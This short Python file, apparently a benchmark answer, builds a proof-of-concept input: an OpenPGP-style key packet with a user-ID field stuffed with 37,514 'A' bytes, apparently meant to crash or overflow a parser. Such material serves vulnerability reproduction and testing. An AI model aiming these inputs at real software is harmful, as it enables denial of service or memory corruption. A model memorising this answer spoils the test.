class Solution:
    def solve(self, src_path: str) -> bytes:
        primary = b'\xc6\x0d\x04\x00\x00\x00\x00\x01\x00\x10\x00\x11\x00\x08\x01'
        body_len = 37514
        body = b'A' * body_len
        len_bytes = b'\xff' + body_len.to_bytes(4, 'big')
        userid = b'\xcd' + len_bytes + body
        poc = primary + userid
        return poc